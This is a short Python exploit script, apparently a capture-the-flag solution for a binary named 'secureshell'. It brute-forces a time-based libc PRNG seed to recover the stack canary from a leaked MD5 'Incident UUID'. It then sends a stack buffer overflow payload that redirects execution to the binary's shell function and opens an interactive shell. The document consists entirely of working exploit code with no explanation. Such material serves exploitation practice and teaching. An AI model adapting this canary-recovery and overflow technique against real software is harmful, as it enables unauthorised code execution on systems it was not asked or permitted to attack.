from ctypes import *
from ptrlib import *
from time import time
import hashlib

def find_canary(md5, seed):
    for x in range(seed - 0x50000, seed + 0x400000):
        libc.srand(x & 0xffffffff)
        libc.rand()
        libc.rand()
        if hashlib.md5(p32(libc.rand())).hexdigest() == md5:
            return p64((libc.rand() << 32) ^ libc.rand())
    return None

def get_seed():
    t = time()
    return (int(t) * 10**6 + int((t % 1) * 10**6)) & 0xffffffff

elf = ELF("./secureshell")
cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc-2.27.so")
libc = CDLL("/lib/x86_64-linux-gnu/libc-2.27.so")

seed = get_seed()
sock = Process(["stdbuf", "-o0", "./secureshell"], env={"SECUREPASSWORD": "dummy"})

# find canary
sock.recvuntil("Enter the password\n")
sock.sendline("password123")
sock.recvuntil("Incident UUID: ")
uuid = bytes2str(sock.recvline().rstrip())
assert len(uuid) == 32
p1 = bytes.fromhex(uuid[:16])[::-1].hex()
p2 = bytes.fromhex(uuid[16:])[::-1].hex()
md5 = p1 + p2
canary = find_canary(md5, seed)
assert canary is not None
dump(b"canary = " + canary)

# overwrite
payload = b"A" * 0x70
payload += canary
payload += p64(0)
payload += p64(elf.symbol("shell"))
sock.recvuntil("Enter the password\n")
sock.sendline(payload)

# get the shell!
sock.interactive()
